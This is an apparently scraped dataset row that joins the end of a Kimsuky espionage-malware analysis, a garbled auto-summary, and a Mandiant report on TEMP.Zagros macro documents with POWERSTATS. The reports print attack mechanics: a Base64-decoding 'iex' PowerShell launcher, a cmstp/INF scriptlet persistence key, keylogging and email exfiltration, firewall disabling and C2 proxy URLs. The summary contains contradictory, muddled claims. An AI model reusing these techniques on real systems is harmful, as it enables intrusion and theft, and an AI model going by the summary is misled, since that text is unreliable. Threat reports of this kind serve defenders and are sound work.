in which keys were typed and the actual sequence of keyboard entry. This data is found in the file C:Program FilesCommon FilesSystemOle DBmsolui80.inc created by the external key logger module.All this data is merged in one file xmlrwbin.inc, which is then encrypted with RC4. The RC4 key is generated as an MD5 hash of a randomly generated 117-bytes buffer. To be able to decipher the data, the attacker should certainly know either the MD5 hash or the whole buffer content. This data is also sent, but RSA encrypted. The malware constructs a 1120 bit public key, uses it to encrypt the 117-bytes buffer. The malware then concatenates all the data to be sent as a 128-bytes block. The resulting data is saved in C:Program FilesCommon FilesSystemOle DB to a file named according to the following format:“<system time>_<account at Bulgarian email server>.txt”, for example, “08191757_beautifl@mail.bg.txt”.The file is then attached to an e-mail and sent to the master’s e-mail account. Following transmission, it is immediately deleted from the victim system.Getting the master’s dataThe malware also retrieves instructions from the mail server. It checks for mails in its Bulgarian e-mail account with a particular subject tag. We have identified several “subject tags” in the network communication: Down_0, Down_1, Happy_0, Happy_2 and ddd_3. When found and the e-mail maintains an attachment, the malware downloads this attachment and saves it with filename “msdaipp.cnt” in C:Program FilesCommon FilesSystemOle DB. The attacker can send additional executables in this way. The executables are RC4 encrypted and then attached. The key for decryption is hardcoded in the malicious samples. It’s interesting that the same “rsh!@!#” string is maintained across all known samples and is used to generate RC4 keys. As described earlier, the malware computes the MD5 of this string and uses the hash as its RC4 key to decrypt the executable. Then, the plain executable is dropped onto disk as “sqlsoldb.exe” and run, and then moved to the C:Windows folder with the file name “taskmgr.exe”. The original e-mail and its attachment are then deleted from the Bulgarian e-mail inbox.Key loggerThe additional key logger module is not very complex — it simply intercepts keystrokes and writes typed keys into C:Program FilesCommon FilesSystemOle DBmsolui80.inc, and also records the active window name where the user pressed keys. We saw this same format in the Madi malware. There is also one key logger variant that logs keystrokes into C:WINDOWSsetup.log.Directory listing collectorThe next program sent to victims enumerates all the drives on the infected system and executes the following command on them:dir <drive letter>: /a /s /t /-cIn practice, this command is written to C:WINDOWSmsdatt.bat and executed with output redirected to C:WINDOWSmsdatl3.inc. As a result, the latter maintains a listing of all files in all the folders on the drive. The malware later reads that data and appends it to content of the file C:Program FilesCommon FilesSystemOle DBoledvbs.inc. At this point, “oledvbs.inc “already stores systeminfo output.It’s interesting that one sample of the directory listing collector was infected with the infamous “Viking” virus of Chinese origin. Some of this virus’ modifications were wandering in the wild for years and its authors or operators would never expect to see it end up in a clandestine APT-related spying tool. For the attackers, this is certainly a big failure. Not only does the original spying program have marks of well-known malware that can be detected by anti-malware products; moreover the attackers are revealing their secret activities to cyber-criminal gangs. However, by all appearances, the attackers noticed the unwanted addition to their malware and got rid of the infection. This was the only sample bearing the Viking virus.Due to expensive work of malware with variety of additional files, it’s not out of place to show these “relationships” in a diagram:HWP document stealerThis module intercepts HWP documents on an infected computer. The HWP file format is similar to Microsoft Word documents, but supported by Hangul, a South Korean word processing application from the Hancom Office bundle. Hancom Office is widely used in South Korea. This malware module works independently of the others and maintains its own Bulgarian e-mail account. The account is hardcoded in the module along with the master’s e-mail to which it sends intercepted documents. It is interesting that the module does not search for all the HWP files on infected computer, but reacts only to those that are opened by the user and steals them. This behavior is very unusual for a document-stealing component and we do not see it in other malicious toolkits.The program copies itself as <Hangul full path>HncReporter.exe and changes the default program association in the registry to open HWP documents. To do so, it alters following registry values:HKEY_CLASSES_ROOTHwp.Document.7shellopencommand or HKEY_CLASSES_ROOTHwp.Document.8shellopencommand 1 2 3 HKEY_CLASSES_ROOTHwp . Document . 7shellopencommand or HKEY_CLASSES_ROOTHwp . Document . 8shellopencommandBy default, there is the registry setting “<Hangul full path>Hwp.exe” “%1” associating Hangul application “Hwp.exe” with .HWP documents. But the malicious program replaces this string with the following: “<Hangul full path>HncReporter.exe ” “%1”. So, when the user is opening any .HWP document, the malware program itself is executed to open the .HWP document. Following this registry edit, any opened .HWP document is read and sent as an e-mail attachment with the subject “Hwp” to the attackers. After sending, the malware executes the real Hangul word processing application “Hwp.exe” to open the .HWP document as the user intended. The means the victim most likely will not notice the theft of the .HWP file. The module’s sending routine depends on the following files in C:Program FilesCommon FilesSystemOle DB folder: xmlrwbin.inc, msdaipp.cnt, msdapml.cnt, msdaerr.cnt, msdmeng.cnt and oledjvs.inc.Remote control module downloaderAn extra program is dedicated exclusively to download attachments out of incoming e-mails with a particular subject tag. This program is similar to the pivot module but with reduced functionality: it maintains the hardcoded Bulgarian e-mail account, logs in, reads incoming e-mails and searches for the special subject tag “Team“. When found, it loads the related attachment, drops it onto the hard drive as C:Program FilesCommon FilesSystemOle DBtaskmgr.exe and executes. This particular executable arrives without any encryption.Remote control moduleIt is also interesting that the malware author did not custom develop a backdoor program. Instead, the author modified TeamViewer client version 5.0.9104. The initial executable pushed by attackers in e-mails related to the remote control module consists of three more executables. Two of them are Team Viewer components themselves, and another is some sort of backdoor loader. So, the dropper creates three files in the C:WindowsSystem32 directory:netsvcs.exe - the modified Team Viewer client; netsvcs_ko.dll - resources library of Team Viewer client; vcmon.exe - installer/starter; 1 2 3 netsvcs . exe - the modified Team Viewer client ; netsvcs_ko . dll - resources library of Team Viewer client ; vcmon . exe - installer / starter ;and creates the service “Remote Access Service“, adjusted to execute C:WindowsSystem32vcmon.exe at system startup. Every time the vcmon.exe is executed, it disables AhnLab’s firewall by zeroing out following registry values:HKLMSOFTWAREAhnLabV3 365 ClinicInternetSec UseFw = 0 UseIps = 0 1 2 3 HKLMSOFTWAREAhnLabV3 365 ClinicInternetSec UseFw = 0 UseIps = 0Then, it modifies the Team Viewer registry settings. As we said, the Team Viewer components used in this campaign are not the original ones. They are slightly modified. In total, we found two different variants of changed versions. The malware author replaced all the entries of “Teamviewer” strings in Team Viewer components. In the first case with the “Goldstager” string and with the string “Coinstager” in the second. TeamViewer client registry settings are then HKLMSoftwareGoldstagerVersion5 and HKLMSoftwareCoinstagerVersion5 correspondingly. The launcher sets up several registry values that control how the remote access tool will work. Among them is SecurityPasswordAES. This parameter represents a hash of the password with which a remote user has to connect to Team Viewer client. This way, the attackers set a pre-shared authentication value. After that, the starter executes the very Team Viewer client netsvcs.exe.Who’s Kim?It’s interesting that the drop box mail accounts iop110112@hotmail.com and rsh1213@hotmail.com are registered with the following “kim” names: kimsukyang and “Kim asdfa”.Of course, we can’t be certain that these are the real names of the attackers. However, the selection isn’t frequently seen. Perhaps it also points to the suspected North Korean origin of attack. Taking into account the profiles of the targeted organizations — South Korean universities that conduct researches on international affairs, produce defense policies for government, national shipping company, supporting groups for Korean unification — one might easily suspect that the attackers might be from North Korea.The targets almost perfectly fall into their sphere of interest. On the other hand, it is not that hard to enter arbitrary registration information and misdirect investigators to an obvious North Korean origin. It does not cost anything to concoct fake registration data and enter kimsukyang during a Hotmail registration. We concede that this registration data does not provide concrete, indisputable information about the attackers.However, the attackers’ IP-addresses do provide some additional clues. During our analysis, we observed ten IP-addresses used by the Kimsuky operators. All of them lie in ranges of the Jilin Province Network and Liaoning Province Network, in China.No other IP-addresses have been uncovered that would point to the attackers’ activity and belong to other IP-ranges. Interestingly, the ISPs providing internet access in these provinces are also believed to maintain lines into North Korea. Finally, this geo-location supports the likely theory that the attackers behind Kimsuky are based in North Korea.AppendixFiles used by malware:%windir%system32kbdlv2.dll %windir%system32auto.dll %windir%system32netsvcs.exe %windir%system32netsvcs_ko.dll %windir%system32vcmon.exe %windir%system32svcsmon.exe %windir%system32svcsmon_ko.dll %windir%system32wsmss.exe %temp%~DFE8B437DD7C417A6D.TMP %temp%~DFE8B43.TMP %temp%~tmp.dll C:Windowstaskmgr.exe C:Windowssetup.log C:Windowswinlog.txt C:Windowsupdate.log C:Windowswmdns.log C:Windowsoledvbs.inc C:Windowsweoig.log C:Windowsdata.dat C:Windowssys.log C:WindowsPcMon.exe C:WindowsGoogle Update.exe C:WindowsReadMe.log C:Windowsmsdatt.bat C:Windowsmsdatl3.inc C:Program FilesCommon FilesSystemOle DBmsdmeng.cnt C:Program FilesCommon FilesSystemOle DBxmlrwbin.inc C:Program FilesCommon FilesSystemOle DBmsdapml.cnt C:Program FilesCommon FilesSystemOle DBsqlsoldb.exe C:Program FilesCommon FilesSystemOle DBoledjvs.inc C:Program FilesCommon FilesSystemOle DBoledvbs.inc C:Program FilesCommon FilesSystemOle DBmsolui80.inc C:Program FilesCommon FilesSystemOle DBmsdaipp.cnt C:Program FilesCommon FilesSystemOle DBmsdaerr.cnt C:Program FilesCommon FilesSystemOle DBsqlxmlx.inc <Hangul full path>HncReporter.exe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 % windir % system32kbdlv2 . dll % windir % system32auto . dll % windir % system32netsvcs . exe % windir % system32netsvcs_ko . dll % windir % system32vcmon . exe % windir % system32svcsmon . exe % windir % system32svcsmon_ko . dll % windir % system32wsmss . exe % temp % ~ DFE8B437DD7C417A6D . TMP % temp % ~ DFE8B43 . TMP % temp % ~ tmp . dll C : Windowstaskmgr . exe C : Windowssetup . log C : Windowswinlog . txt C : Windowsupdate . log C : Windowswmdns . log C : Windowsoledvbs . inc C : Windowsweoig . log C : Windowsdata . dat C : Windowssys . log C : WindowsPcMon . exe C : WindowsGoogle Update . exe C : WindowsReadMe . log C : Windowsmsdatt . bat C : Windowsmsdatl3 . inc C : Program FilesCommon FilesSystemOle DBmsdmeng . cnt C : Program FilesCommon FilesSystemOle DBxmlrwbin . inc C : Program FilesCommon FilesSystemOle DBmsdapml . cnt C : Program FilesCommon FilesSystemOle DBsqlsoldb . exe C : Program FilesCommon FilesSystemOle DBoledjvs . inc C : Program FilesCommon FilesSystemOle DBoledvbs . inc C : Program FilesCommon FilesSystemOle DBmsolui80 . inc C : Program FilesCommon FilesSystemOle DBmsdaipp . cnt C : Program FilesCommon FilesSystemOle DBmsdaerr . cnt C : Program FilesCommon FilesSystemOle DBsqlxmlx . inc < Hangul full path > HncReporter . exeRelated MD5:3baaf1a873304d2d607dbedf47d3e2b4 3195202066f026de3abfe2f966c9b304 4839370628678f0afe3e6875af010839 173c1528dc6364c44e887a6c9bd3e07c 191d2da5da0e37a3bb3cbca830a405ff 5eef25dc875cfcb441b993f7de8c9805 b20c5db37bda0db8eb1af8fc6e51e703 face9e96058d8fe9750d26dd1dd35876 9f7faf77b1a2918ddf6b1ef344ae199d d0af6b8bdc4766d1393722d2e67a657b 45448a53ec3db51818f57396be41f34f 80cba157c1cd8ea205007ce7b64e0c2a f68fa3d8886ef77e623e5d94e7db7e6c 4a1ac739cd2ca21ad656eaade01a3182 4ea3958f941de606a1ffc527eec6963f 637e0c6d18b4238ca3f85bcaec191291 b3caca978b75badffd965a88e08246b0 dbedadc1663abff34ea4bdc3a4e03f70 3ae894917b1d8e4833688571a0573de4 8a85bd84c4d779bf62ff257d1d5ab88b d94f7a8e6b5d7fc239690a7e65ec1778 f1389f2151dc35f05901aba4e5e473c7 96280f3f9fd8bdbe60a23fa621b85ab6 f25c6f40340fcde742018012ea9451e0 122c523a383034a5baef2362cad53d57 2173bbaea113e0c01722ff8bc2950b28 2a0b18fa0887bb014a344dc336ccdc8c ffad0446f46d985660ce1337c9d5eaa2 81b484d3c5c347dc94e611bae3a636a3 ab73b1395938c48d62b7eeb5c9f3409d 69930320259ea525844d910a58285e15 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 3baaf1a873304d2d607dbedf47d3e2b4 3195202066f026de3abfe2f966c9b304 4839370628678f0afe3e6875af010839 173c1528dc6364c44e887a6c9bd3e07c 191d2da5da0e37a3bb3cbca830a405ff 5eef25dc875cfcb441b993f7de8c9805 b20c5db37bda0db8eb1af8fc6e51e703 face9e96058d8fe9750d26dd1dd35876 9f7faf77b1a2918ddf6b1ef344ae199d d0af6b8bdc4766d1393722d2e67a657b 45448a53ec3db51818f57396be41f34f 80cba157c1cd8ea205007ce7b64e0c2a f68fa3d8886ef77e623e5d94e7db7e6c 4a1ac739cd2ca21ad656eaade01a3182 4ea3958f941de606a1ffc527eec6963f 637e0c6d18b4238ca3f85bcaec191291 b3caca978b75badffd965a88e08246b0 dbedadc1663abff34ea4bdc3a4e03f70 3ae894917b1d8e4833688571a0573de4 8a85bd84c4d779bf62ff257d1d5ab88b d94f7a8e6b5d7fc239690a7e65ec1778 f1389f2151dc35f05901aba4e5e473c7 96280f3f9fd8bdbe60a23fa621b85ab6 f25c6f40340fcde742018012ea9451e0 122c523a383034a5baef2362cad53d57 2173bbaea113e0c01722ff8bc2950b28 2a0b18fa0887bb014a344dc336ccdc8c ffad0446f46d985660ce1337c9d5eaa2 81b484d3c5c347dc94e611bae3a636a3 ab73b1395938c48d62b7eeb5c9f3409d 69930320259ea525844d910a58285e15Names of services created by malware:DriverManage WebService WebClientManager Remote Access Service 1 2 3 4 DriverManage WebService WebClientManager Remote Access ServiceWe detect these threats as Trojan.Win32.Kimsuky except modified Team Viewer client components which are detected as Trojan.Win32.Patched.ps.";The cyber espionage campaign targeting South Korean think-tanks has been identified, and AhnLab products are being targeted by sophisticated attackers. Malware may be delivered via malicious emails and downloads. Attackers attempt to evade antivirus and firewall solutions. Malware is focused on system information and file outputs. Viking malware and HWP document stealing malware are potential targets. Regularly updated anti-malware software is recommended to prevent malicious files. Users in industries targeted by HWP document stealing malware should be protected by anti-malware software. Documents should be opened with Microsoft Word regularly updated anti-malware software in order to prevent macro-injection. Users should not open unfamiliar documents with suspicious attachments or links. Malware modifies registry values to open a malicious file in a legitimate application″s place. Organizations should keep security patches updated, implement firewalls and intrusion detection systems, and other security measures. Regularly update anti-malware software to detect and prevent malicious files. Users should use strong passwords and limit access to sensitive networks and data. Organizations should stay up to date with the latest best practices and trends in the security industry. Malware has been modified to target users in specific regions mainly Jilin Province and Liaoning province in China. Attackers are targeting North Korean computers in Jilin and Liaoning provinces. Security mitigation techniques, updates and malware prevention are necessary. Toolbar and Google updates, may indicate an IT security;en;
https://www.mandiant.com/resources/blog/iranian-threat-group-updates-ttps-in-spear-phishing-campaign;Iranian Threat Group Updates Tactics, Techniques and Procedures in Spear Phishing Campaign;"IntroductionFrom January 2018 to March 2018, through FireEye’s Dynamic Threat Intelligence, we observed attackers leveraging the latest code execution and persistence techniques to distribute malicious macro-based documents to individuals in Asia and the Middle East.We attribute this activity to TEMP.Zagros (reported by Palo Alto Networks and Trend Micro as MuddyWater), an Iran-nexus actor that has been active since at least May 2017. This actor has engaged in prolific spear phishing of government and defense entities in Central and Southwest Asia. The spear phishing emails and attached malicious macro documents typically have geopolitical themes. When successfully executed, the malicious documents install a backdoor we track as POWERSTATS.One of the more interesting observations during the analysis of these files was the re-use of the latest AppLocker bypass, and lateral movement techniques for the purpose of indirect code execution. The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system.Campaign TimelineIn this campaign, the threat actor’s tactics, techniques and procedures (TTPs) shifted after about a month, as did their targets. A brief timeline of this activity is shown in Figure 1.Figure 1: Timeline of this recently observed spear phishing campaignThe first part of the campaign (From Jan. 23, 2018, to Feb. 26, 2018) used a macro-based document that dropped a VBS file and an INI file. The INI file contains the Base64 encoded PowerShell command, which will be decoded and executed by PowerShell using the command line generated by the VBS file on execution using WScript.exe. The process chain is shown in Figure 2.Figure 2: Process chain for the first part of the campaignAlthough the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it. One such example of the VBS invoking PowerShell via MSHTA is shown in Figure 3.Figure 3: VBS invoking PowerShell via MSHTAThe second part of the campaign (from Feb. 27, 2018, to March 5, 2018) used a new variant of the macro that does not use VBS for PowerShell code execution. Instead, it uses one of the recently disclosed code execution techniques leveraging INF and SCT files, which we will go on to explain later in the blog.Infection VectorWe believe the infection vector for all of the attacks involved in this campaign are macro-based documents sent as an email attachment. One such email that we were able to obtain was targeting users in Turkey, as shown in Figure 4.Figure 4: Sample spear phishing email containing macro-based document attachmentThe malicious Microsoft Office attachments that we observed appear to have been specially crafted for individuals in four countries: Turkey, Pakistan, Tajikistan and India. What follows is four examples, and a complete list is available in the Indicators of Compromise section at the end of the blog.Figure 5 shows a document purporting to be from the National Assembly of Pakistan.Figure 5: Document purporting to be from the National Assembly of PakistanA document purporting to be from the Turkish Armed Forces, with content written in the Turkish language, is shown in Figure 6.Figure 6: Document purporting to be from the Turkish Armed ForcesA document purporting to be from the Institute for Development and Research in Banking Technology (established by the Reserve Bank of India) is shown in Figure 7.Figure 7: Document purporting to be from the Institute for Development and Research in Banking TechnologyFigure 8 shows a document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of Tajikistan.Figure 8: Document written in Tajik that purports to be from the Ministry of Internal Affairs of the Republic of TajikistanEach of these macro-based documents used similar techniques for code execution, persistence and communication with the command and control (C2) server.Indirect Code Execution Through INF and SCTThis scriptlet code execution technique leveraging INF and SCT files was recently discovered and documented in February 2018. The threat group in this recently observed campaign – TEMP.Zagros – weaponized their malware using the following techniques.The macro in the Word document drops three files in a hard coded path: C:\programdata. Since the path is hard coded, the execution will only be observed in operating systems, Windows 7 and above. The following are the three files:Defender.sct – The malicious JavaScript based scriptlet file.– The malicious JavaScript based scriptlet file. DefenderService.inf – The INF file that is used to invoke the above scriptlet file.– The INF file that is used to invoke the above scriptlet file. WindowsDefender.ini – The Base64 encoded and obfuscated PowerShell script.After dropping the three files, the macro will set the following registry key to achieve persistence:\REGISTRY\USER\SID\Software\Microsoft\Windows\CurrentVersion\Run\""WindowsDefenderUpdater"" = cmstp.exe /s c:\programdata\DefenderService.infUpon system restart, cmstp.exe will be used to execute the SCT file indirectly through the INF file. This is possible because inside the INF file we have the following section:[UnRegisterOCXSection]%11%\scrobj.dll,NI,c:/programdata/Defender.sctThat section gets indirectly invoked through the DefaultInstall_SingleUser section of INF, as shown in Figure 9.Figure 9: Indirectly invoking SCT through the DefaultInstall_SingleUser section of INFThis method of code execution is performed in an attempt to evade security products. FireEye MVX and HX Endpoint Security technology successfully detect this code execution technique.SCT File AnalysisThe code of the Defender.sct file is an obfuscated JavaScript. The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line:powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini)The rest of the malicious activities are performed by the PowerShell Script.PowerShell File AnalysisThe PowerShell script employs several layers of obfuscation to hide its actual functionality. In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools.Some of the key obfuscation techniques used are:Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult.Figure 10: Character replacement and string reversing techniquesPowerShell Environment Variables: Nowadays, malware authors commonly mask critical strings such as “IEX” using environment variables. Some of the instances used in this script are: $eNv:puBLic[13]+$ENv:pUBLIc[5]+'x' ($ENV:cOMsPEC[4,26,25]-jOin'')Nowadays, malware authors commonly mask critical strings such as “IEX” using environment variables. Some of the instances used in this script are: XOR encoding: The biggest section of the PowerShell script is XOR encoded using a single byte key, as shown in Figure 11.Figure 11: PowerShell script is XOR encoded using a single byte keyAfter deobfuscating the contents of the PowerShell Script, we can divide it into three sections.Section 1The first section of the PowerShell script is responsible for setting different key variables that are used by the remaining sections of the PowerShell script, especially the following variables:TEMpPAtH = ""C:\ProgramData\"" (the path used for storing the temp files)Get_vAlIdIP = https://api.ipify.org/ (used to get the public IP address of the machine)FIlENAmePATHP = WindowsDefender.ini (file used to store Powershell code)PRIVAtE = Private Key exponentsPUbLIc = Public Key exponentsHklm = ""HKLM:\Software\""Hkcu = ""HKCU:\Software\""ValuE = ""kaspersky""SYSIDDrAGon_MidDLe = [array of proxy URLs]Among those variables, there is one variable of particular interest, DrAGon_MidDLe, which stores the list of proxy URLs (detailed at the end of the blog in the Network Indicators portion of the Indicators of Compromise section) that will be used to interact with the C2 server, as shown in Figure 12.Figure 12: DrAGon_MidDLe stores the list of proxy URLs used to interact with C2 serverSection 2The second section of the PowerShell script has the ability to perform encryption and decryption of messages that are exchanged between the system and the C2 server. The algorithm used for encryption and decryption is RSA, which leverages the public and private key exponents included in Section 1 of the PowerShell script.Section 3The third section of the PowerShell script is the biggest section and has a wide variety of functionalities.During analysis, we observed a code section where a message written in Chinese and hard coded in the script will be printed in the case of an error while connecting to the C2 server:The English translation for this message is: “Cannot connect to website, please wait for dragon”.Other functionalities provided by this section of the PowerShell Script are as follows:Retrieves the following data from the system by leveraging Windows Management Instrumentation (WMI) queries and environment variables: IP Address from Network Adapter Configuration OS Name OS Architecture Computer Name Computer Domain Name UsernameAll of this data is concatenated and formatted as shown in Figure 13.Figure 13: Concatenated and formatted data retrieved by PowerShell scriptRegister the victim’s machine to the C2 server by sending the REGISTER command to the server. In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim’s machine and the C2 server.While sending to the C2 server, the data is formatted as follows:@{SYSINFO = $get.ToString(); ACTION = ""REGISTER"";}Ability to take screenshots.Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14.Figure 14: System shut down upon discovery of security toolsAbility to receive PowerShell script from the C2 server and execute on the machine. Several techniques are employed for executing the PowerShell code: If command starts with “excel”, then it leverages DDEInitiate Method of Excel.Appilcation to execute the code:If the command starts with “outlook”, then it leverages Outlook.Application and MSHTA to execute the code:If the command starts with “risk”, then execution is performed through DCOM object:File upload functionality.Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPVFigure 15: Disabling Microsoft Office Protected ViewAbility to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16.Figure 16: Reboot, shut down and clean commandsAbility to sleep for a given number of seconds.The following table summarizes the main C2 commands supported by this PowerShell Script.C2 Command Purpose reboot Reboot the system using shutdown command shutdown Shut down the system using shutdown command clean Wipe the Drives, C:\, D:\, E:\, F:\ screenshot Take a screenshot of the System upload Encrypt and upload the information from the system excel Leverage Excel.Application COM object for code execution outlook Leverage Outlook.Application COM object for code execution risk Leverage DCOM object for code executionConclusionThis activity shows us that TEMP.Zagros stays up-to-date with the latest code execution and persistence mechanism techniques, and that they can quickly leverage these techniques to update their malware. By combining multiple layers of obfuscation, they deter the process of reverse engineering and also attempt to evade security products.Users can protect themselves from such attacks by disabling Office macros in their settings and also by being more vigilant when enabling macros (especially when prompted) in documents, even if such documents are from seemingly trusted sources.Indicators of CompromiseMacro based Documents and HashesSHA256 Hash Filename Targeted Region eff78c23790ee834f773569b52cddb01dc3c4dd9660f5a476af044ef6fe73894 na.doc Pakistan 76e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338 Invest in Turkey.doc Turkey 6edc067fc2301d7a972a654b3a07398d9c8cbe7bb38d1165b80ba4a13805e5ac güvenlik yönergesi. .doc Turkey 009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0 idrbt.doc India 18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6 Türkiye Cumhuriyeti Kimlik Kart?.doc Turkey 3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb Turkish Armed Forces.doc Turkey 9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c na.gov.pk.doc Pakistan 3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115 MVD-FORM-1800.doc Tajikistan cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88 KEGM-CyberAttack.doc Turkey 1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942 IL-1801.doc Turkey aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627 kiyiemniyeti.doc Turkey 93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84 TCELL-S1-M.doc Tajikistan c87799cce6d65158da97aa31a5160a0a6b6dd5a89dea312604cc66ed5e976cc9 egm-1.doc Turkey 2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13 Connectel .pk.doc Pakistan 18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd gÃŸvenlik_yÃœnergesi_.doc Turkey 153117aa54492ca955b540ac0a8c21c1be98e9f7dd8636a36d73581ec1ddcf58 MIT.doc Turkey d07d4e71927cab4f251bcc216f560674c5fb783add9c9f956d3fc457153be025 Gvenlik Ynergesi.doc Turkey af5f102f0597db9f5e98068724e31d68b8f7c23baeea536790c50db587421102 Gvenlik Ynergesi.doc Turkey 5550615affe077ddf66954edf132824e4f1fe16b3228e087942b0cad0721a6af NA Turkey 3d96811de7419a8c090a671d001a85f2b1875243e5b38e6f927d9877d0ff9b0c Anadolu GÃ¼neydoÄŸu Projesinde .doc TurkeyNetwork IndicatorsList of Proxy URLshxxp://alessandrofoglino[.]com//db_template.phphxxp://www.easy-home-sales[.]co.za//db_template.phphxxp://www.almaarefut[.]com/admin/db_template.phphxxp://chinamall[.]co.za//db_template.phphxxp://amesoulcoaching[.]com//db_template.phphxxp://www.antigonisworld[.]com/wp-includes/db_template.phphxxps://anbinni.ba/wp-admin/db_template.phphxxp://arctistrade[.]de/wp/db_template.phphxxp://aianalytics[.]ie//db_template.phphxxp://www.gilforsenate[.]com//db_template.phphxxp://mgamule[.]co.za/oldweb/db_template.phphxxp://chrisdejager-attorneys[.]co.za//db_template.phphxxp://alfredocifuentes[.]com//db_template.phphxxp://alxcorp[.]com//db_template.phphxxps://www.aircafe24[.]com//db_template.phphxxp://agencereferencement.be/wp-admin/db_template.phphxxp://americanlegacies[.]org/webthed_ftw/db_template.phphxxps://aloefly[.]net//db_template.phphxxp://www.duotonedigital[.]co.za//db_template.phphxxp://architectsinc[.]net//db_template.phphxxp://www.tanati[.]co.za//db_template.phphxxp://emware[.]co.za//db_template.phphxxp://breastfeedingbra[.]co.za//db_template.phphxxp://alhidayahfoundation[.]co[.]uk/category/db_template.phphxxp://cashforyousa[.]co.za//db_template.phphxxps://www.airporttaxi-uk[.]co[.]uk/wp-includes/db_template.phphxxp://antjetaubert[.]de//db_template.phphxxp://hesterwebber[.]co.za//db_template.phphxxp://fickstarelectrical[.]co.za//db_template.phphxxp://alex-frost[.]com/assets/db_template.phphxxps://americanbrasil[.]com.br//db_template.phphxxps://aileeshop[.]com//db_template.phphxxps://annodle[.]com//db_template.phphxxp://goldeninstitute[.]co.za/contents/db_template.phphxxp://ednpk[.]com//db_template.phphxxp://www.arabiccasinochoice[.]com//db_template.phphxxp://proeventsports[.]co.za//db_template.phphxxp://glenbridge[.]co.za//db_template.phphxxp://berped[.]co.za//db_template.phphxxp://best-digital-slr-cameras[.]com//db_template.phphxxp://antonhirvonen[.]com/pengalandet.se/wp-includes/db_template.phphxxp://www.alpacal[.]com//db_template.phphxxps://www.alakml[.]com/wp-admin/db_template.phphxxp://ar-rihla[.]com//db_template.phphxxp://appsvoice[.]info//db_template.phphxxp://www.bashancorp[.]co.za//db_template.phphxxp://alexanderbecker[.]net/services/db_template.phphxxp://visionclinic.co.ls/visionclinic/db_template.phphxxps://www.angelesrevista[.]com//db_template.phphxxps://www.antojoentucocina[.]com//db_template.phphxxp://apollonweb[.]com//db_template.phphxxps://www.alphapixa[.]com//db_template.phphxxp://capitalradiopetition[.]co.za//db_template.phphxxp://www.generictoners[.]co.za//db_template.phphxxps://alnahdatraining[.]com//db_template.phphxxps://albousala[.]com//db_template.phphxxps://www.dopetroleum[.]com//db_template.phphxxp://bios-chip[.]co.za//db_template.phphxxp://www.crissamconsulting[.]co.za//db_template.phphxxp://capriflower[.]co.za//db_template.phphxxp://www.dingaanassociates[.]co.za//db_template.phphxxp://indiba-africa[.]co.za//db_template.phphxxp://verifiedseller[.]co.za/js/db_template.phphxxps://www.buraqlubricant[.]com//db_template.phphxxp://aqarco[.]com/wp-admin/db_template.phphxxp://allaboutblockchain[.]net//db_template.phphxxp://www.amexcars[.]info/tpl/db_template.phphxxp://clandecor[.]co.za/rvsUtf8Backup/db_template.phphxxp://bakron[.]co.za//db_template.phphxxp://gsnconsulting[.]co.za//db_template.phphxxp://vumavaluations[.]co.za//db_template.phphxxp://heritagetravelmw[.]com//db_template.phphxxp://ampvita[.]com//db_template.phphxxp://ahero-resource-center[.]org/administrator/db_template.phphxxps://arbulario[.]com//db_template.phphxxp://havilahglo[.]co.za/wpscripts/db_template.phphxxp://www.bestdecorativemirrors[.]com/More-Mirrors/db_template.phphxxp://delectronics[.]com[.]pk//db_template.phphxxp://antucomp[.]com//db_template.phphxxp://advocatetn[.]com/font-awesome/fonts/db_template.phphxxps://amooy[.]com/webservice/db_template.phphxxp://www.harmonyguesthouse[.]co.za//db_template.phphxxp://alanrori[.]com//db_template.phphxxp://algarvesup[.]com//db_template.phphxxp://desirablehair[.]co.za//db_template.phphxxp://comsip[.]org.mw//db_template.phphxxp://jdcorporate[.]co.za/catalog/db_template.phphxxp://andrewfinnburhoe[.]com//db_template.phphxxp://anyeva[.]com/wp-includes/db_template.phphxxp://www.agenceuhd[.]com//db_template.phphxxp://host4unix[.]net/host24new/db_template.phphxxp://www.altaica[.]ca/wordpress/db_template.phphxxp://www.allbuyer[.]co[.]uk//db_template.phphxxp://jvpsfunerals[.]co.za//db_template.phphxxp://immaculatepainters[.]co.za//db_template.phphxxp://tcpbereka[.]co.za/js/db_template.phphxxp://clientcare.co.ls//db_template.phphxxp://investaholdings[.]co.za/htc/db_template.phphxxp://www.amjobs[.]co[.]uk//db_template.phphxxp://www.agirlgonewine[.]com/store/db_template.phphxxp://findinfo-more[.]com//db